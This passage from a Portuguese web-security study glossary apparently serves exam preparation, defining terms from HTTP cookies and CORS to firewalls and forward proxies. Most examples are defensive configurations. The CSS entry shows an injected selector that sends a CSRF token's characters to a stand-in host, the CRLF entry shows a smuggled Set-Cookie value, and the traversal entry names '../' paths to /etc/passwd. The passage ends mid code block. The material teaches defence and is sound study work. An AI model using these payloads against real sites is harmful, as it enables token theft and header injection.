- **Exemplo de utilização**: Na aba **Network**, clique com o botão direito no cabeçalho das colunas, marque **Connection ID** e observe que todos os recursos `h2` do mesmo domínio compartilham um único ID (ex.: `14892`), enquanto no `http/1.1` o navegador abre até 6 IDs simultâneos por host.

##### Cookie (HTTP Cookie)
- **Nome**: HTTP Cookie (Biscoito HTTP / Cookie Web — RFC 6265 e RFC 6265bis).
- **Significado**: Pequeno fragmento de dados em formato `chave=valor` enviado pelo servidor na resposta HTTP através do cabeçalho `Set-Cookie` e armazenado pelo navegador, que passa a reenviá-lo automaticamente ao servidor no cabeçalho `Cookie` de todas as requisições subsequentes que satisfaçam suas regras de escopo (`Domain`, `Path`), tempo de vida (`Expires` / `Max-Age`) e políticas de segurança (`Secure`, `HttpOnly`, `SameSite=Strict|Lax|None`, `Partitioned` e prefixos `__Host-` / `__Secure-`). É o mecanismo padrão para manutenção de estado e gerenciamento de sessão sobre o protocolo HTTP (naturalmente *stateless*).
- **Explicação simples**: É a pulseirinha de identificação colocada no seu pulso na entrada de um evento: a cada barraca ou área restrita que você visita lá dentro, você mostra automaticamente a pulseira sem precisar preencher sua ficha de cadastro de novo.
- **Exemplo de utilização**: Configuração completa de um cookie de sessão seguro utilizando o prefixo `__Host-`:
  ```http
  Set-Cookie: __Host-sid=9f8e7d6c5b4a3f2e1d0c; Max-Age=3600; Path=/; Secure; HttpOnly; SameSite=Lax
  ```

##### COOP (Cross-Origin-Opener-Policy)
- **Nome**: COOP (*Cross-Origin-Opener-Policy* — Política de Abertura de Origem Cruzada).
- **Significado**: Header de segurança de resposta HTTP que isola o documento de nível superior (*top-level document*) em seu próprio grupo de contexto de navegação (*Browsing Context Group*), impedindo que janelas pop-up abertas a partir dele (ou páginas que o abriram via `window.open()`) mantenham uma referência direta ao objeto `window` (`window.opener`) quando forem de origens diferentes. Seus valores são `unsafe-none`, `same-origin-allow-popups` e `same-origin`. Protege contra ataques de *XS-Leaks* (*Cross-Site Leaks*), *Reverse Tabnabbing* e compartilhamento de processo de renderização explorável por ataques *Spectre*.
- **Explicação simples**: Garante que, se o seu aplicativo bancário abrir um link externo em outra aba (ou for aberto a partir de um site desconhecido), a outra aba não fique com um "controle remoto" (`window.opener`) ligado à janela do seu banco.
- **Exemplo de utilização**: Cabeçalho HTTP isolando completamente a janela da aplicação contra referências cruzadas:
  ```http
  Cross-Origin-Opener-Policy: same-origin
  ```

##### CORP (Cross-Origin-Resource-Policy)
- **Nome**: CORP (*Cross-Origin-Resource-Policy* — Política de Recursos de Origem Cruzada).
- **Significado**: Header de segurança de resposta HTTP que instrui o navegador a bloquear o carregamento daquele recurso específico (como uma imagem dinâmica, avatar privado, script ou JSON) por páginas pertencentes a outras origens ou outros sites, mesmo através de tags HTML que historicamente contornam a *Same-Origin Policy* (como `<img>`, `<script>`, `<link>`, `<video>`). Aceita os valores `same-origin` (apenas a mesma origem exata pode carregar), `same-site` (apenas o mesmo site registrável e seus subdomínios) ou `cross-origin` (qualquer origem pode carregar).
- **Explicação simples**: Enquanto o CORS protege a leitura de dados via JavaScript (`fetch`), o CORP é um segurança na porta de cada foto ou arquivo do servidor dizendo: "Esta foto de documento do cliente não pode nem sequer aparecer em uma tag `<img>` colocada dentro do site de um estranho".
- **Exemplo de utilização**: Protegendo imagens privadas de perfil para que não sejam embutidas ou sondadas por sites externos:
  ```http
  Cross-Origin-Resource-Policy: same-origin
  ```

##### CORS (Cross-Origin Resource Sharing)
- **Nome**: CORS (*Cross-Origin Resource Sharing* — Compartilhamento de Recursos de Origem Cruzada — WHATWG Fetch Standard).
- **Significado**: Mecanismo baseado em cabeçalhos HTTP que permite a um servidor indicar explicitamente ao navegador quais origens externas (`Origin: esquema://host:porta`) têm permissão para ler suas respostas via JavaScript (`fetch()` ou `XMLHttpRequest`), flexibilizando de forma controlada a **Same-Origin Policy (SOP)**. Envolve cabeçalhos de resposta como `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers` e `Vary: Origin`, além de requisições automáticas de pré-verificação (**Preflight** via método `OPTIONS`) para requisições não simples. **Atenção para provas**: o CORS não é uma defesa contra ataques de escrita como CSRF; ele é um mecanismo de relaxamento controlado da SOP impostado pelo navegador na leitura da resposta (veja [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1) e [Headers de Segurança](./05-headers-de-seguranca.md#s5)).
- **Explicação simples**: Por padrão, o navegador proíbe que o site A leia dados do site B (SOP). O CORS é uma autorização por escrito que o servidor B entrega ao navegador dizendo: "O site `https://app.exemplo.test` é nosso parceiro oficial; pode deixar o código JavaScript dele ler os dados desta resposta".
- **Exemplo de utilização**: Configuração segura de resposta CORS para um front-end específico que envia cookies/credenciais:
  ```http
  Access-Control-Allow-Origin: https://app.exemplo.test
  Access-Control-Allow-Credentials: true
  Vary: Origin
  ```

##### Credenciais (Credentials)
- **Nome**: Credenciais (*Credentials* — Credenciais de Autenticação e Transporte HTTP).
- **Significado**:
  1. Em Segurança da Informação, é qualquer artefato secreto ou criptográfico utilizado para comprovar identidade ou autorização (senhas, tokens Bearer/JWT, chaves de API, chaves privadas SSH, certificados de cliente mTLS ou cookies de sessão).
  2. Na Fetch API (`fetch(url, { credentials })`) e no protocolo CORS, o termo *credentials* refere-se especificamente aos dados de autenticação gerenciados automaticamente pelo navegador nas requisições HTTP: **cookies**, cabeçalhos de **autenticação HTTP** (`Authorization` nativo) e **certificados TLS de cliente**.
- **Explicação simples**: São os seus documentos e chaves de acesso: tanto a senha que você digita quanto o crachá automático (cookie) que o navegador leva junto quando faz um pedido ao servidor.
- **Exemplo de utilização**: Em chamadas `fetch()` cross-origin, o navegador **não** envia cookies a menos que `credentials: 'include'` seja definido no JS e o servidor responda com `Access-Control-Allow-Credentials: true`:
  ```javascript
  fetch('https://api.exemplo.test/v1/sessao', { credentials: 'include' });
  ```

##### Criptografia Simétrica e Assimétrica
- **Nome**: Criptografia de Chave Simétrica (*Symmetric-Key Cryptography*) e Criptografia de Chave Assimétrica / Chave Pública (*Public-Key / Asymmetric Cryptography*).
- **Significado**: Os dois paradigmas fundamentais da criptografia moderna:
  1. **Simétrica**: utiliza **uma única chave secreta compartilhada** tanto para cifrar (encriptar) quanto para decifrar a mensagem (ex.: `AES-GCM`, `ChaCha20-Poly1305`) ou assinar via MAC (`HMAC-SHA256` / `HS256`). É extremamente rápida e usada para cifrar o tráfego de dados do HTTPS após o handshake.
  2. **Assimétrica**: utiliza um **par de chaves matematicamente vinculadas** — uma **Chave Pública** (distribuída abertamente) e uma **Chave Privada** (mantida em segredo absoluto pelo titular) — baseadas em problemas matemáticos difíceis como fatoração de primos ou curvas elípticas (ex.: `RSA`, `ECDSA` / `ES256`, `Ed25519`, `ECDHE`). Permite assinar digitalmente certificados/JWTs com a chave privada (para que qualquer um verifique com a chave pública) e negociar chaves efêmeras no handshake TLS sem precisar transmitir um segredo prévio pela rede.
- **Explicação simples**: Criptografia **simétrica** é a chave da porta da sua casa: quem tranca e quem destranca precisa ter uma cópia idêntica da mesma chave física. Criptografia **assimétrica** é uma caixa de correio com fenda na rua: qualquer pessoa pode colocar uma carta pela abertura pública (chave pública) ou conferir o selo oficial do remetente, mas só o dono da casa tem a chave do cadeado interno (chave privada) para abrir a caixa ou emitir aquele selo.
- **Exemplo de utilização**: No **TLS 1.3**, o servidor usa criptografia **assimétrica** (certificado X.509 + `ECDHE`) durante o handshake para provar sua identidade e acordar um segredo efêmero, e imediatamente passa a usar criptografia **simétrica** (`AES-256-GCM`) para transmitir os dados HTTP em alta velocidade.

##### CRLF Injection (HTTP Response Splitting)
- **Nome**: CRLF Injection (*Carriage Return / Line Feed Injection* e *HTTP Response Splitting* — CWE-93 / CWE-113).
- **Significado**: Vulnerabilidade que ocorre quando uma aplicação insere dados controlados pelo usuário dentro de um cabeçalho de resposta HTTP (como `Location` em um redirecionamento ou `Set-Cookie`) sem filtrar os caracteres de controle de quebra de linha **CR** (*Carriage Return*, `\r`, `%0d`, `0x0D`) e **LF** (*Line Feed*, `\n`, `%0a`, `0x0A`). Como o protocolo HTTP/1.1 (RFC 9112) utiliza a sequência `CRLF` (`\r\n`) para delimitar o fim de cada cabeçalho e uma sequência dupla `\r\n\r\n` para separar os cabeçalhos do corpo da resposta, a injeção de `%0d%0a` permite ao atacante injetar cabeçalhos arbitrários (`Set-Cookie`) ou até mesmo forjar um corpo HTML inteiro com XSS (*HTTP Response Splitting*).
- **Explicação simples**: Num formulário em papel onde cada linha é uma ordem oficial para o navegador, o atacante escreve o nome dele seguido de um "Enter" invisível (`\r\n`) e, na linha debaixo, escreve uma ordem falsa como "Defina este cookie".
- **Exemplo de utilização**: Se o parâmetro `?lang=pt%0d%0aSet-Cookie:%20admin=true` for refletido sem validação em `Location: /home?lang=...`, a resposta HTTP será dividida em dois cabeçalhos distintos. Frameworks modernos bloqueiam `\r` e `\n` em valores de headers por padrão.

##### CSRF (Cross-Site Request Forgery)
- **Nome**: CSRF (*Cross-Site Request Forgery* — Falsificação de Requisição Entre Sites, também chamada de *XSRF* ou *Session Riding* — CWE-352).
- **Significado**: Vulnerabilidade na qual um site externo malicioso (`https://atacante.test`) induz o navegador de uma vítima que já está autenticada em uma aplicação confiável (`https://banco.exemplo.test`) a disparar uma requisição HTTP não intencional que altera estado no servidor (como transferir valores, trocar senha ou alterar e-mail). O ataque funciona porque, historicamente, o navegador anexa automaticamente os cookies da sessão de `banco.exemplo.test` em requisições cross-site (como submissões de `<form method="POST">` ou carregamento de `<img>`), fazendo o servidor acreditar que a ação partiu voluntariamente do usuário. As defesas incluem **Anti-CSRF Tokens** imprevisíveis vinculados à sessão, atributos de cookie `SameSite=Lax` ou `SameSite=Strict`, validação dos cabeçalhos `Origin` / `Sec-Fetch-Site` e reautenticação para operações críticas (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: Você está com o crachá do trabalho no pescoço (cookie ativo) tomando café na rua; um golpista esbarra em você e faz você apertar sem perceber um botão que manda uma ordem para a portaria da sua empresa. Como a portaria só olha se você está usando o crachá e não pergunta se você realmente quis apertar o botão, ela acata a ordem.
- **Exemplo de utilização**: Formulário HTML com proteção Anti-CSRF sincronizada no servidor:
  ```html
  <form action="/api/v1/transferencia" method="POST">
    <input type="hidden" name="_csrf" value="8f4a9c2e1b7d6035a4e8c9b2d1f0e3a7">
    <input type="number" name="valor" value="500">
    <button type="submit">Transferir</button>
  </form>
  ```

##### CSP (Content-Security-Policy)
- **Nome**: CSP (*Content-Security-Policy* — Política de Segurança de Conteúdo — W3C CSP Level 3).
- **Significado**: Header de segurança de resposta HTTP que permite ao servidor declarar uma lista rigorosa de permissões (*allowlist*), *nonces* criptográficos ou hashes SHA sobre quais recursos (scripts JavaScript, folhas de estilo CSS, imagens, fontes, conexões `fetch`/WebSocket, formulários e iframes) o navegador está autorizado a carregar e executar naquela página. É a camada mais eficaz de defesa em profundidade para mitigar o impacto de **Cross-Site Scripting (XSS)** (bloqueando scripts inline não autorizados e uso de `eval()`) e **Clickjacking** (por meio da diretiva `frame-ancestors`).
- **Explicação simples**: É a lista de convidados VIP entregue aos seguranças da festa (navegador): mesmo que um penetra (script XSS injetado) consiga pular o muro e entrar no salão (HTML), o segurança confere se ele tem a senha única daquela noite (`nonce-...`); se não tiver, é impedido de tocar música (executar JS).
- **Exemplo de utilização**: Política CSP moderna baseada em *nonce* (veja detalhes completos em [Headers de Segurança](./05-headers-de-seguranca.md#s5)):
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'nonce-rAnd0mN0nc3Base64==' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';
  ```

##### CSS (Cascading Style Sheets)
- **Nome**: CSS (*Cascading Style Sheets* — Folhas de Estilo em Cascata).
- **Significado**: Linguagem declarativa de folhas de estilo utilizada para descrever a apresentação visual, o layout, a tipografia, as cores, a responsividade e o posicionamento espacial (*Box Model*, *Flexbox*, *Grid*) de documentos estruturados em HTML ou SVG. Embora não seja uma linguagem de programação Turing-completa tradicional no navegador, folhas de estilo injetadas por atacantes (*CSS Injection*) podem causar problemas severos de segurança, como **UI Redressing / Clickjacking** (`opacity: 0`, `position: fixed; z-index: 999999`) e **exfiltração de dados de atributos HTML** via seletores de atributo combinados com `background-image: url(...)`.
- **Explicação simples**: Se o HTML é a estrutura de alvenaria de uma casa (paredes, portas e janelas), o CSS é a pintura, o piso, a iluminação e a decoração que definem a aparência de cada cômodo.
- **Exemplo de utilização**: Exemplo de como uma injeção de CSS poderia tentar exfiltrar o valor de um token CSRF presente no atributo `value` de um `<input>` (bloqueado por uma CSP com `style-src` e `img-src` restritos):
  ```css
  input[name="_csrf"][value^="a"] {
    background-image: url("https://atacante.test/roubo?inicio=a");
  }
  ```

##### CSSOM (CSS Object Model)
- **Nome**: CSSOM (*CSS Object Model* — Modelo de Objetos CSS).
- **Significado**: Representação em estrutura de árvore em memória construída pelo motor de renderização do navegador (*Blink* no Chrome) a partir do parsing de todas as regras CSS aplicáveis ao documento, análoga ao DOM para o HTML. O navegador combina a árvore **DOM** com a árvore **CSSOM** para construir a **Render Tree** (Árvore de Renderização) e calcular o layout visual da página; além disso, expõe APIs JavaScript (`document.styleSheets`, `element.style`, `window.getComputedStyle()`) que permitem inspecionar e modificar estilos dinamicamente em tempo de execução.
- **Explicação simples**: É a planta de decoração traduzida para uma árvore lógica dentro da memória do navegador, que é cruzada com a planta das paredes (DOM) antes de desenhar os pixels na tela.
- **Exemplo de utilização**: Leitura segura do estilo computado final de um elemento via API do CSSOM no Console:
  ```javascript
  const botao = document.querySelector('#btn-pagar');
  console.log(window.getComputedStyle(botao).visibility); // "visible"
  ```

##### CWE (Common Weakness Enumeration)
- **Nome**: CWE (*Common Weakness Enumeration* — Enumeração de Fraquezas Comuns).
- **Significado**: Catálogo comunitário internacional mantido pela corporação MITRE que classifica e atribui um identificador numérico único (`CWE-NNN`) a cada tipo específico de fraqueza de arquitetura, design ou código-fonte em software e hardware. Enquanto o **CVE** (*Common Vulnerabilities and Exposures*) identifica uma falha específica descoberta em um produto real (ex.: uma falha em uma versão do Apache), o **CWE** descreve a *causa-raiz conceitual* da vulnerabilidade (ex.: `CWE-79` para XSS, `CWE-89` para SQL Injection, `CWE-22` para Path Traversal, `CWE-352` para CSRF).
- **Explicação simples**: O CWE é o código da doença no catálogo médico internacional (ex.: "CWE-89 = Injeção de SQL"), enquanto o OWASP Top 10 é o ranking das 10 maiores causas de internação do ano.
- **Exemplo de utilização**: Referência técnica em um relatório de auditoria de segurança vinculando a falha encontrada à sua classificação normativa:
  ```text
  Achado #01: Concatenação direta de parâmetro GET em query SQL
  Classificação: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
  Categoria OWASP Top 10: A03:2021 / A05:2025 - Injection
  ```


---

<a id="s8-d"></a>
### 8.4 Letra D

##### DHCP (Dynamic Host Configuration Protocol)
- **Nome**: DHCP (*Dynamic Host Configuration Protocol* — Protocolo de Configuração Dinâmica de Hosts — RFC 2131).
- **Significado**: Protocolo cliente-servidor da camada de Aplicação (operando sobre **UDP nas portas 67 para o servidor e 68 para o cliente**) que automatiza a concessão temporária (*lease*) de parâmetros de configuração de rede para dispositivos recém-conectados a uma sub-rede IP. Opera por meio do fluxo de 4 mensagens **DORA**: **D**iscover (broadcast do cliente buscando servidores), **O**ffer (oferta de IP pelo servidor), **R**equest (solicitação formal do IP ofertado) e **A**cknowledge (confirmação final com entrega de endereço IP, máscara de sub-rede, **Gateway Padrão** e servidores **DNS**). Em redes locais sem proteção, está sujeito a ataques de *Rogue DHCP Server* (servidor DHCP falso que entrega um gateway malicioso para interceptar o tráfego) e *DHCP Starvation*, mitigados em switches gerenciáveis via **DHCP Snooping** (veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: É a recepção de um hotel: quando você chega sem quarto definido, você pede uma vaga no balcão (*Discover*), o recepcionista oferece o quarto 204 (*Offer*), você aceita (*Request*) e ele entrega a chave junto com a senha do Wi-Fi e o número do ramal da portaria (*Acknowledge*).
- **Exemplo de utilização**: Renovação ou inspeção das configurações recebidas via DHCP no terminal:
  ```bash
  # Windows (PowerShell / CMD)
  ipconfig /all
  # Linux
  ip addr show && ip route show
  ```

##### Directory Traversal (e Directory Listing)
- **Nome**: Directory Traversal (Travessia de Diretórios — CWE-22) e Directory Listing (Listagem Indevida de Diretórios — CWE-548).
- **Significado**:
  1. **Directory Traversal**: vulnerabilidade (sinônimo técnico de **Path Traversal** no contexto de navegação na árvore de diretórios) em que uma aplicação utiliza entradas não sanitizadas do usuário contendo sequências `../` (*dot-dot-slash*) ou `..\` para escapar do diretório raiz previsto pelo servidor web e ler ou sobrescrever arquivos sensíveis do sistema operacional (como `/etc/passwd`, arquivos `.env` ou chaves privadas).
  2. **Directory Listing**: falha de configuração do servidor web (*Security Misconfiguration* — ex.: `autoindex on` no Nginx ou `Options +Indexes` no Apache) que faz o servidor exibir automaticamente uma página HTML listando todos os arquivos e subpastas existentes quando um diretório não possui arquivo de índice (`index.html`), expondo backups `.bak`, `.sql` ou `.git`.
- **Explicação simples**: *Directory Traversal* é pedir ao bibliotecário o livro `../../cofre/contabilidade.pdf` para fazê-lo sair da estante pública e buscar uma pasta trancada na diretoria; *Directory Listing* é o bibliotecário entregar o catálogo completo de todas as gavetas da sala sempre que você pede uma prateleira sem especificar o livro.
- **Exemplo de utilização**: Desativando a listagem de diretórios no Nginx (**[REQUISITO]** em servidores de produção):
  ```nginx
  location /arquivos/ {
      autoindex off;
  }
  ```

##### DNS (Domain Name System)
- **Nome**: DNS (*Domain Name System* — Sistema de Nomes de Domínio — RFC 1034 e RFC 1035).
- **Significado**: Sistema de nomenclatura hierárquico e distribuído globalmente (operando por padrão na **porta 53 UDP** para consultas rápidas e **53 TCP** para respostas maiores que 512 bytes sem EDNS0 ou para transferências de zona `AXFR`) que traduz nomes de domínio legíveis por humanos (como `api.exemplo.test`) em endereços IP numéricos roteáveis (`192.0.2.15` via registro `A` para IPv4 ou `2001:db8::15` via registro `AAAA` para IPv6), além de armazenar registros de correio (`MX`), apelidos (`CNAME`), servidores autoritativos (`NS`), políticas de texto/autenticação (`TXT`, como SPF e DMARC) e autorização de emissão de certificados (`CAA`).
- **Explicação simples**: É a agenda de contatos global da Internet: você digita o nome da loja na barra de endereços, e o DNS descobre instantaneamente para qual número de telefone (endereço IP) o seu computador precisa ligar.
- **Exemplo de utilização**: Consulta DNS detalhada utilizando utilitários de linha de comando:
  ```bash
  nslookup -type=A loja-ficticia.test
  dig +short AAAA loja-ficticia.test
  ```

##### DNSSEC (Domain Name System Security Extensions)
- **Nome**: DNSSEC (*Domain Name System Security Extensions* — Extensões de Segurança do DNS — RFC 4033, RFC 4034 e RFC 4035).
- **Significado**: Conjunto de extensões ao protocolo DNS que adiciona **autenticidade de origem** e **integridade de dados** às respostas DNS por meio de assinaturas digitais de chave pública (registros `RRSIG`, `DNSKEY`, `DS` e `NSEC`/`NSEC3`), formando uma cadeia criptográfica de confiança desde a zona raiz (`.`) até o domínio final. Previne ataques de **DNS Cache Poisoning / DNS Spoofing** (nos quais um atacante injeta um endereço IP falso na resposta DNS). **Atenção para provas**: o DNSSEC autentica a resposta, mas **não cifra** o conteúdo da consulta DNS (para confidencialidade contra bisbilhoteiros na rede, utilizam-se **DoH** ou **DoT**).
- **Explicação simples**: É um selo de autenticidade com firma reconhecida na resposta da lista telefônica: qualquer um no caminho ainda vê qual número você perguntou, mas ninguém consegue falsificar a resposta nem trocar o número verdadeiro do banco pelo número de um golpista.
- **Exemplo de utilização**: Verificando a presença da flag `ad` (*Authenticated Data*) e da assinatura `RRSIG` com `dig`:
  ```bash
  dig +dnssec exemplo.test A
  # flags: qr rd ra ad; QUERY: 1, ANSWER: 2 (A + RRSIG)
  ```

##### DoH e DoT (DNS over HTTPS / DNS over TLS)
- **Nome**: DoH (*DNS over HTTPS* — RFC 8484) e DoT (*DNS over TLS* — RFC 7858).
- **Significado**: Protocolos de transporte seguros que encapsulam as consultas e respostas DNS dentro de sessões criptografadas TLS, impedindo que provedores de acesso (ISPs), administradores de Wi-Fi público ou atacantes *Man-in-the-Middle* (MitM) espionem quais domínios o usuário está acessando ou manipulem as respostas em trânsito. O **DoT** utiliza uma porta dedicada (**853 TCP**) exclusivamente para tráfego DNS sobre TLS, facilitando sua identificação e governança por firewalls corporativos; já o **DoH** encapsula consultas DNS como requisições HTTPS normais na **porta 443**, misturando-as ao tráfego web comum.
- **Explicação simples**: No DNS tradicional, você pergunta em voz alta no meio da praça "Qual é o endereço do site X?" (qualquer um ao redor escuta). Com DoT ou DoH, você manda essa pergunta dentro de um envelope lacrado e criptografado para o resolvedor DNS.
- **Exemplo de utilização**: No Google Chrome, o recurso **Use secure DNS** (*Usar DNS seguro* em `chrome://settings/security`) utiliza DoH automaticamente para cifrar a fase de *DNS Lookup* antes da conexão ao site.

##### DOM (Document Object Model)
- **Nome**: DOM (*Document Object Model* — Modelo de Objetos de Documento — WHATWG DOM Standard).
- **Significado**: Interface de programação multiplataforma que representa um documento HTML ou XML carregado na memória do navegador como uma árvore hierárquica de **nós** (*nodes*: `Document`, `Element`, `Text`, `Comment`, `Attr`). O JavaScript interage com o DOM para ler e alterar dinamicamente a estrutura, o conteúdo e os eventos da página (`document.querySelector()`, `element.addEventListener()`). Do ponto de vista de segurança, a inserção de dados não confiáveis em propriedades do DOM que interpretam HTML (sumidouros ou *sinks* perigosos, como `element.innerHTML`, `element.outerHTML` e `document.write()`) é a causa direta de vulnerabilidades de **DOM-Based XSS**, devendo-se utilizar propriedades seguras como `element.textContent` (veja [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1) e [Console](./02c-devtools-console.md#s2-3)).
- **Explicação simples**: É a maquete viva e interativa da página web dentro da memória do navegador: quando o JavaScript adiciona um botão ou muda um texto na maquete (DOM), a tela do usuário se atualiza na mesma hora.
- **Exemplo de utilização**: Manipulação segura do DOM contra XSS utilizando `createElement` e `textContent`:
  ```javascript
  const item = document.createElement('li');
  item.textContent = comentarioDoUsuario; // Seguro: escapa tags HTML como texto puro
  document.querySelector('#lista-comentarios').appendChild(item);
  ```

---

<a id="s8-e"></a>
### 8.5 Letra E

##### ETag (Entity Tag)
- **Nome**: `ETag` (*Entity Tag* — Etiqueta de Entidade HTTP — RFC 9110).
- **Significado**: Header de resposta HTTP que fornece um identificador opaco de versão (frequentemente um hash ou marcador de revisão entre aspas, como `ETag: "686897696a7c876b7e"` ou um validador fraco `W/"v2-104"`) associado ao estado exato de um recurso em determinada URL. Permite a **revalidação condicional de cache**: quando o cache expira, o navegador envia o valor guardado no cabeçalho de requisição `If-None-Match`. Se o arquivo no servidor não mudou, o servidor responde apenas com `304 Not Modified` (sem corpo), economizando largura de banda.
- **Explicação simples**: É o código de edição/impressão de uma apostila: antes de baixar um arquivo de 5 MB de novo, o navegador pergunta ao servidor: "Eu já tenho a versão de código `abc123`; mudou alguma coisa?". Se não mudou, o servidor responde apenas "304: pode usar a que você já tem na gaveta".
- **Exemplo de utilização**: Par de requisição condicional e resposta `304 Not Modified` visível na aba [Network](./02a-devtools-network.md#s2-1):
  ```http
  GET /assets/app.bundle.js HTTP/1.1
  Host: loja-ficticia.test
  If-None-Match: "9f8e7d6c5b"

  HTTP/1.1 304 Not Modified
  ETag: "9f8e7d6c5b"
  Cache-Control: public, max-age=3600
  ```

##### Eval (`eval()` e Execução Dinâmica de Código)
- **Nome**: `eval()` (Função JavaScript de Avaliação Dinâmica de Strings).
- **Significado**: Função global nativa do JavaScript que recebe uma string de texto e a compila e executa como código JavaScript arbitrário no escopo de execução atual. Junto com seus equivalentes funcionais — `new Function("...")`, `setTimeout("string", ms)` e `setInterval("string", ms)` —, o `eval()` é considerado um **sumidouro crítico de execução (*execution sink*)**: se qualquer fragmento da string avaliada tiver origem em dados controlados pelo usuário (URL, `postMessage`, API, `localStorage`), ocorre imediatamente uma vulnerabilidade grave de **Cross-Site Scripting (XSS)**. Políticas de **CSP** bloqueiam `eval()` por padrão, a menos que a diretiva insegura `'unsafe-eval'` seja adicionada.
- **Explicação simples**: É dar um microfone aberto ligado ao sistema de comando da empresa para ler em voz alta um bilhete escrito por um estranho: se o bilhete contiver uma ordem maliciosa disfarçada de texto, o sistema a executa sem questionar.
- **Exemplo de utilização**: Substituição obrigatória (**[REQUISITO]**) de `eval()` por `JSON.parse()` ao processar dados estruturados:
  ```javascript
  // INSEGURO: permite execução de código arbitrário (XSS)
  const dadosInseguros = eval('(' + respostaTexto + ')');

  // SEGURO: interpreta exclusivamente dados JSON, sem executar funções
  const dadosSeguros = JSON.parse(respostaTexto);
  ```

---

<a id="s8-f"></a>
### 8.6 Letra F

##### Fetch (`fetch()` / Fetch API)
- **Nome**: Fetch API (`window.fetch()` — WHATWG Fetch Standard).
- **Significado**: Interface moderna nativa dos navegadores (e ambientes como Node.js e Service Workers) baseada em **Promises** (`async`/`await`) para realizar requisições HTTP/HTTPS assíncronas via JavaScript, substituindo com vantagens ergonômicas e arquiteturais a antiga API `XMLHttpRequest` (XHR). Integra-se nativamente com políticas de **CORS**, **CSP (`connect-src`)**, controle de cache, envio configurável de credenciais (`credentials: 'same-origin' | 'include' | 'omit'`) e interceptação por **Service Workers**. **Detalhe clássico de prova**: a Promise do `fetch()` **não é rejeitada** em códigos de erro HTTP como `404` ou `500` (ela resolve normalmente com `response.ok === false`); ela só rejeita em falhas de rede, DNS, TLS ou bloqueio de CORS.
- **Explicação simples**: É o mensageiro expresso do JavaScript: sem precisar recarregar a página inteira na tela do usuário, ele vai silenciosamente até o servidor nos bastidores, entrega ou busca uma encomenda (JSON) e avisa quando voltar.
- **Exemplo de utilização**: Requisição `POST` com tratamento correto de status HTTP usando `fetch()`:
  ```javascript
  const resp = await fetch('https://api.exemplo.test/v1/itens', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ nome: 'Caderno' })
  });
  if (!resp.ok) throw new Error(`Erro HTTP: ${resp.status}`);
  ```

##### File Upload Vulnerability (Vulnerabilidade de Upload de Arquivos)
- **Nome**: Unrestricted Upload of File with Dangerous Type (Vulnerabilidade de Upload Irrestrito de Arquivos — CWE-434).
- **Significado**: Falha de segurança que ocorre quando uma aplicação web permite que usuários enviem arquivos ao servidor sem validar rigorosamente sua extensão real, seu conteúdo binário (*magic bytes*), seu tamanho e seu destino de armazenamento. Se um atacante conseguir enviar um script executável pelo servidor (`.php`, `.jsp`, `.aspx` — conhecido como **Web Shell**) ou um arquivo HTML/SVG contendo JavaScript malicioso que seja posteriormente servido na mesma origem da aplicação, ele alcança **Execução Remota de Código (RCE)** no servidor ou **Stored XSS** no navegador de outros usuários (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: É deixar uma caixa de entrega de documentos na recepção sem revista: alguém pede para guardar uma "foto de perfil", mas entrega um arquivo executável (`shell.php`) ou um desenho SVG com script embutido e depois pede ao servidor para abrir esse arquivo lá dentro.
- **Exemplo de utilização**: Controles essenciais de defesa ao servir arquivos enviados por usuários (além de renomear para UUID e armazenar fora do *webroot* em domínio segregado):
  ```http
  Content-Type: application/octet-stream
  Content-Disposition: attachment; filename="documento-seguro.pdf"
  X-Content-Type-Options: nosniff
  ```

##### Firewall (Stateless, Stateful e NGFW)
- **Nome**: Firewall de Rede (*Packet Filtering / Stateless*, *Stateful Inspection* e *NGFW — Next-Generation Firewall*).
- **Significado**: Dispositivo físico ou virtual de segurança de perímetro e segmentação interna (operando tipicamente nas Camadas 3 e 4 do modelo OSI, ou até a Camada 7 nos NGFWs) que monitora e filtra o tráfego de rede de entrada (*ingress*) e saída (*egress*) com base em um conjunto ordenado de regras de controle de acesso (ACLs).
  - **Stateless (Filtro de Pacotes)**: avalia cada pacote isoladamente (IP de origem/destino, porta e protocolo) sem memória de conexões.
  - **Stateful**: mantém uma tabela de estado das conexões ativas (ex.: handshakes TCP estabelecidos), permitindo automaticamente pacotes de retorno legítimos.
  - **NGFW**: adiciona inspeção profunda de pacotes (DPI — *Deep Packet Inspection*), identificação de aplicações e prevenção de intrusões (IPS). Deve operar sob o princípio de **Default Deny** (bloquear tudo o que não for explicitamente permitido).
- **Explicação simples**: O firewall *stateless* é um guarda que olha apenas o endereço escrito em cada envelope individualmente; o *stateful* é um porteiro com livro de registro que anota quem os moradores convidaram para entrar, liberando a volta sem burocracia e barrando quem tenta entrar da rua sem ter sido chamado.
- **Exemplo de utilização**: Configuração de política *default deny* de entrada liberando apenas HTTPS (443/TCP) no `ufw` (Linux):
  ```bash
  sudo ufw default deny incoming
  sudo ufw default allow outgoing
  sudo ufw allow 443/tcp
  ```

##### Forward Proxy (Proxy Direto)
- **Nome**: Forward Proxy (Proxy Direto ou Proxy de Saída Cliente).
- **Significado**: Servidor intermediário posicionado na borda da rede dos **clientes** (ex.: dentro de uma rede corporativa ou universidade) que recebe as requisições de saída dos navegadores internos e as encaminha para a Internet em nome deles. Serve para aplicar controle de acesso e filtragem de conteúdo de saída (bloquear sites maliciosos, DLP — *Data Loss Prevention*), realizar cache compartilhado de pacotes/arquivos, registrar logs de auditoria e ocultar os endereços IP internos dos clientes perante os servidores externos. Contrasta diretamente com o **Reverse Proxy** (Proxy Reverso), que protege os servidores de origem.
- **Explicação simples**: É o comprador oficial de uma empresa: os funcionários internos não vão diretamente às lojas da rua; eles fazem o pedido ao comprador da empresa (Forward Proxy), que confere se a compra é permitida pela diretoria e vai até a rua buscá-la.
- **Exemplo de utilização**: Configuração de variável de ambiente em um servidor interno para que ferramentas de linha de comando saiam exclusivamente via Forward Proxy corporativo:
  ```bash
